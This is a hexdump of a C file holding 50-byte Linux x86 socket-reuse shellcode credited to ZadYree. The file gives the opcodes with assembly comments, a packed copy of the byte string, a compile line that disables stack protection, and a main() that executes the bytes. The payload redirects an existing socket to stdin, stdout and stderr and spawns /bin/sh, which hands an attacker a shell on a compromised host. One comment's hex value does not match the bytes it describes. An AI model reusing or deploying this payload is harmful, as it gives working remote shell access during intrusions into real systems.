00000000  2f 2a 20 53 6f 63 6b 65  74 20 52 65 2d 75 73 65  |/* Socket Re-use|
00000010  20 43 6f 6d 62 6f 20 66  6f 72 20 6c 69 6e 75 78  | Combo for linux|
00000020  20 78 38 36 20 73 79 73  74 65 6d 73 20 62 79 20  | x86 systems by |
00000030  5a 61 64 59 72 65 65 20  2d 2d 20 35 30 20 62 79  |ZadYree -- 50 by|
00000040  74 65 73 0a 2a 20 3c 7a  61 64 79 72 65 65 40 74  |tes.* <zadyree@t|
00000050  75 78 66 61 6d 69 6c 79  2e 6f 72 67 3e 0a 2a 0a  |uxfamily.org>.*.|
00000060  2a 20 4d 61 64 65 20 75  73 69 6e 67 20 73 6f 63  |* Made using soc|
00000070  6b 66 64 20 74 72 69 63  6b 20 2b 20 64 75 70 32  |kfd trick + dup2|
00000080  28 30 2c 30 29 2c 20 64  75 70 32 28 30 2c 31 29  |(0,0), dup2(0,1)|
00000090  2c 20 64 75 70 32 28 30  2c 32 29 20 2b 0a 2a 20  |, dup2(0,2) +.* |
000000a0  65 78 65 63 76 65 20 2f  62 69 6e 2f 73 68 0a 2a  |execve /bin/sh.*|
000000b0  0a 2a 20 54 68 61 6e 6b  73 3a 20 43 68 61 72 6c  |.* Thanks: Charl|
000000c0  65 73 20 53 74 65 76 65  6e 73 6f 6e 2c 20 69 70  |es Stevenson, ip|
000000d0  76 2c 20 33 4c 52 56 53  20 72 65 73 65 61 72 63  |v, 3LRVS researc|
000000e0  68 20 74 65 61 6d 0a 2a  0a 2a 20 67 63 63 20 2d  |h team.*.* gcc -|
000000f0  6f 20 73 6f 63 6b 65 74  5f 72 65 75 73 65 20 73  |o socket_reuse s|
00000100  6f 63 6b 65 74 5f 72 65  75 73 65 2e 63 20 2d 7a  |ocket_reuse.c -z|
00000110  20 65 78 65 63 73 74 61  63 6b 0a 2a 2f 0a 0a 63  | execstack.*/..c|
00000120  68 61 72 20 73 68 65 6c  6c 63 6f 64 65 5b 5d 3d  |har shellcode[]=|
00000130  20 2f 2a 20 57 65 20 75  73 65 20 73 79 73 5f 64  | /* We use sys_d|
00000140  75 70 28 32 29 20 74 6f  20 67 65 74 20 74 68 65  |up(2) to get the|
00000150  20 70 72 65 76 69 6f 75  73 20 61 74 74 72 69 62  | previous attrib|
00000160  75 74 65 64 20 73 6f 63  6b 66 64 20 2a 2f 0a 22  |uted sockfd */."|
00000170  5c 78 36 61 5c 78 30 32  22 20 20 20 20 20 20 2f  |\x6a\x02"      /|
00000180  2f 20 70 75 73 68 20 30  78 32 0a 22 5c 78 35 62  |/ push 0x2."\x5b|
00000190  22 20 20 20 20 20 20 20  20 20 20 2f 2f 20 70 6f  |"          // po|
000001a0  70 20 65 62 78 0a 22 5c  78 36 61 5c 78 32 39 22  |p ebx."\x6a\x29"|
000001b0  20 20 20 20 20 20 2f 2f  20 70 75 73 68 20 30 78  |      // push 0x|
000001c0  32 39 0a 22 5c 78 35 38  22 20 20 20 20 20 20 20  |29."\x58"       |
000001d0  20 20 20 2f 2f 20 70 6f  70 20 65 61 78 0a 22 5c  |   // pop eax."\|
000001e0  78 63 64 5c 78 38 30 22  20 20 20 20 20 20 2f 2f  |xcd\x80"      //|
000001f0  20 69 6e 74 20 30 78 38  30 20 2d 3e 20 63 61 6c  | int 0x80 -> cal|
00000200  6c 20 64 75 70 28 32 29  0a 22 5c 78 34 38 22 20  |l dup(2)."\x48" |
00000210  20 20 20 20 20 20 20 20  20 2f 2f 20 64 65 63 20  |         // dec |
00000220  65 61 78 0a 2f 2a 20 4e  6f 77 20 45 41 58 20 3d  |eax./* Now EAX =|
00000230  20 6f 75 72 20 53 6f 63  6b 65 74 20 46 69 6c 65  | our Socket File|
00000240  20 44 65 73 63 72 69 70  74 6f 72 20 2a 2f 0a 0a  | Descriptor */..|
00000250  22 5c 78 38 39 5c 78 63  36 22 20 20 20 20 20 20  |"\x89\xc6"      |
00000260  2f 2f 20 6d 6f 76 20 65  73 69 2c 20 65 61 78 0a  |// mov esi, eax.|
00000270  0a 2f 2a 20 64 75 70 32  28 66 64 2c 30 29 3b 20  |./* dup2(fd,0); |
00000280  64 75 70 32 28 66 64 2c  31 29 3b 20 64 75 70 32  |dup2(fd,1); dup2|
00000290  28 66 64 2c 32 29 3b 20  2a 2f 0a 22 5c 78 33 31  |(fd,2); */."\x31|
000002a0  5c 78 63 39 22 20 20 20  20 20 20 20 20 20 20 20  |\xc9"           |
000002b0  20 20 20 20 20 20 20 2f  2f 20 78 6f 72 20 20 20  |       // xor   |
000002c0  20 25 65 63 78 2c 25 65  63 78 0a 22 5c 78 35 36  | %ecx,%ecx."\x56|
000002d0  22 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |"               |
000002e0  20 20 20 20 20 20 20 2f  2f 20 70 75 73 68 20 20  |       // push  |
000002f0  20 25 65 73 69 0a 22 5c  78 35 62 22 20 20 20 20  | %esi."\x5b"    |
00000300  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000310  20 20 2f 2f 20 70 6f 70  20 20 20 20 25 65 62 78  |  // pop    %ebx|
00000320  0a 2f 2f 20 6c 6f 6f 70  3a 0a 22 5c 78 36 61 5c  |.// loop:."\x6a\|
00000330  78 33 66 22 20 20 20 20  20 20 20 20 20 20 20 20  |x3f"            |
00000340  20 20 20 20 20 20 2f 2f  20 70 75 73 68 20 20 20  |      // push   |
00000350  24 30 78 33 66 0a 22 5c  78 35 38 22 20 20 20 20  |$0x3f."\x58"    |
00000360  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000370  20 20 2f 2f 20 70 6f 70  20 20 20 20 25 65 61 78  |  // pop    %eax|
00000380  0a 22 5c 78 63 64 5c 78  38 30 22 20 20 20 20 20  |."\xcd\x80"     |
00000390  20 20 20 20 20 20 20 20  20 20 20 20 20 2f 2f 20  |             // |
000003a0  69 6e 74 20 20 20 20 24  30 78 38 30 0a 22 5c 78  |int    $0x80."\x|
000003b0  34 31 22 20 20 20 20 20  20 20 20 20 20 20 20 20  |41"             |
000003c0  20 20 20 20 20 20 20 20  20 2f 2f 20 69 6e 63 20  |         // inc |
000003d0  20 20 20 25 65 63 78 0a  22 5c 78 38 30 5c 78 66  |   %ecx."\x80\xf|
000003e0  39 5c 78 30 33 22 20 20  20 20 20 20 20 20 20 20  |9\x03"          |
000003f0  20 20 20 20 2f 2f 20 63  6d 70 20 20 20 20 24 30  |    // cmp    $0|
00000400  78 33 2c 25 63 6c 0a 22  5c 78 37 35 5c 78 66 35  |x3,%cl."\x75\xf5|
00000410  22 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |"               |
00000420  20 20 20 2f 2f 20 6a 6e  65 20 20 20 20 38 30 34  |   // jne    804|
00000430  38 33 65 38 20 3c 6c 6f  6f 70 3e 0a 0a 2f 2a 20  |83e8 <loop>../* |
00000440  65 78 65 63 76 65 20 2f  62 69 6e 2f 73 68 20 62  |execve /bin/sh b|
00000450  79 20 69 70 76 20 2a 2f  0a 22 5c 78 36 61 5c 78  |y ipv */."\x6a\x|
00000460  30 62 22 20 20 20 20 20  20 20 20 20 20 20 20 20  |0b"             |
00000470  20 20 20 20 20 2f 2f 20  70 75 73 68 20 62 79 74  |     // push byt|
00000480  65 20 30 78 62 0a 22 5c  78 35 38 22 20 20 20 20  |e 0xb."\x58"    |
00000490  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000004a0  20 20 2f 2f 20 70 6f 70  20 65 61 78 0a 22 5c 78  |  // pop eax."\x|
000004b0  39 39 22 20 20 20 20 20  20 20 20 20 20 20 20 20  |99"             |
000004c0  20 20 20 20 20 20 20 20  20 2f 2f 20 63 64 71 0a  |         // cdq.|
000004d0  22 5c 78 35 32 22 20 20  20 20 20 20 20 20 20 20  |"\x52"          |
000004e0  20 20 20 20 20 20 20 20  20 20 20 20 2f 2f 20 70  |            // p|
000004f0  75 73 68 20 65 64 78 0a  22 5c 78 33 31 5c 78 66  |ush edx."\x31\xf|
00000500  36 22 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |6"              |
00000510  20 20 20 20 2f 2f 20 78  6f 72 20 65 73 69 2c 20  |    // xor esi, |
00000520  65 73 69 20 2d 20 57 65  20 61 64 64 20 74 68 6f  |esi - We add tho|
00000530  73 65 20 69 6e 73 74 72  75 63 74 69 6f 6e 73 0a  |se instructions.|
00000540  22 5c 78 35 36 22 20 20  20 20 20 20 20 20 20 20  |"\x56"          |
00000550  20 20 20 20 20 20 20 20  20 20 20 20 2f 2f 20 70  |            // p|
00000560  75 73 68 20 65 73 69 20  20 20 20 20 2d 20 74 6f  |ush esi     - to|
00000570  20 63 6c 65 61 6e 20 75  70 20 74 68 65 20 61 72  | clean up the ar|
00000580  67 20 73 74 61 63 6b 0a  22 5c 78 36 38 5c 78 32  |g stack."\x68\x2|
00000590  66 5c 78 32 66 5c 78 37  33 5c 78 36 38 22 20 20  |f\x2f\x73\x68"  |
000005a0  20 20 20 20 2f 2f 20 70  75 73 68 20 64 77 6f 72  |    // push dwor|
000005b0  64 20 30 78 36 38 37 33  32 66 32 66 0a 22 5c 78  |d 0x68732f2f."\x|
000005c0  36 38 5c 78 32 66 5c 78  36 32 5c 78 36 39 5c 78  |68\x2f\x62\x69\x|
000005d0  36 65 22 20 20 20 20 20  20 2f 2f 20 70 75 73 68  |6e"      // push|
000005e0  20 64 77 6f 72 64 20 30  78 36 65 36 39 39 32 32  | dword 0x6e69922|
000005f0  66 0a 22 5c 78 38 39 5c  78 65 33 22 20 20 20 20  |f."\x89\xe3"    |
00000600  20 20 20 20 20 20 20 20  20 20 20 20 20 20 2f 2f  |              //|
00000610  20 6d 6f 76 20 65 62 78  2c 20 65 73 70 0a 22 5c  | mov ebx, esp."\|
00000620  78 33 31 5c 78 63 39 22  20 20 20 20 20 20 20 20  |x31\xc9"        |
00000630  20 20 20 20 20 20 20 20  20 20 2f 2f 20 78 6f 72  |          // xor|
00000640  20 65 63 78 2c 20 65 63  78 0a 22 5c 78 63 64 5c  | ecx, ecx."\xcd\|
00000650  78 38 30 22 3b 20 20 20  20 20 20 20 20 20 20 20  |x80";           |
00000660  20 20 20 20 20 20 2f 2f  20 69 6e 74 20 30 78 38  |      // int 0x8|
00000670  30 0a 3b 0a 0a 2f 2a 20  0a 0a 73 68 65 6c 6c 63  |0.;../* ..shellc|
00000680  6f 64 65 5b 5d 3d 0a 22  5c 78 36 61 5c 78 30 32  |ode[]=."\x6a\x02|
00000690  5c 78 35 62 5c 78 36 61  5c 78 32 39 5c 78 35 38  |\x5b\x6a\x29\x58|
000006a0  5c 78 63 64 5c 78 38 30  5c 78 34 38 5c 78 38 39  |\xcd\x80\x48\x89|
000006b0  5c 78 63 36 22 0a 22 5c  78 33 31 5c 78 63 39 5c  |\xc6"."\x31\xc9\|
000006c0  78 35 36 5c 78 35 62 5c  78 36 61 5c 78 33 66 5c  |x56\x5b\x6a\x3f\|
000006d0  78 35 38 5c 78 63 64 5c  78 38 30 5c 78 34 31 5c  |x58\xcd\x80\x41\|
000006e0  78 38 30 22 0a 22 5c 78  66 39 5c 78 30 33 5c 78  |x80"."\xf9\x03\x|
000006f0  37 35 5c 78 66 35 5c 78  36 61 5c 78 30 62 5c 78  |75\xf5\x6a\x0b\x|
00000700  35 38 5c 78 39 39 5c 78  35 32 5c 78 33 31 5c 78  |58\x99\x52\x31\x|
00000710  66 36 22 0a 22 5c 78 35  36 5c 78 36 38 5c 78 32  |f6"."\x56\x68\x2|
00000720  66 5c 78 32 66 5c 78 37  33 5c 78 36 38 5c 78 36  |f\x2f\x73\x68\x6|
00000730  38 5c 78 32 66 5c 78 36  32 5c 78 36 39 5c 78 36  |8\x2f\x62\x69\x6|
00000740  65 22 0a 22 5c 78 38 39  5c 78 65 33 5c 78 33 31  |e"."\x89\xe3\x31|
00000750  5c 78 63 39 5c 78 63 64  5c 78 38 30 22 3b 0a 0a  |\xc9\xcd\x80";..|
00000760  2a 2f 0a 0a 0a 69 6e 74  20 6d 61 69 6e 28 76 6f  |*/...int main(vo|
00000770  69 64 29 0a 7b 0a 20 70  72 69 6e 74 66 28 22 53  |id).{. printf("S|
00000780  68 65 6c 6c 63 6f 64 65  20 6c 65 6e 67 74 68 3a  |hellcode length:|
00000790  20 25 64 5c 6e 22 2c 20  73 74 72 6c 65 6e 28 73  | %d\n", strlen(s|
000007a0  68 65 6c 6c 63 6f 64 65  29 29 3b 0a 20 28 2a 28  |hellcode));. (*(|
000007b0  76 6f 69 64 28 2a 29 28  29 29 20 73 68 65 6c 6c  |void(*)()) shell|
000007c0  63 6f 64 65 29 28 29 3b  20 20 0a 20 72 65 74 75  |code)();  . retu|
000007d0  72 6e 20 30 3b 0a 7d                              |rn 0;.}|
000007d7
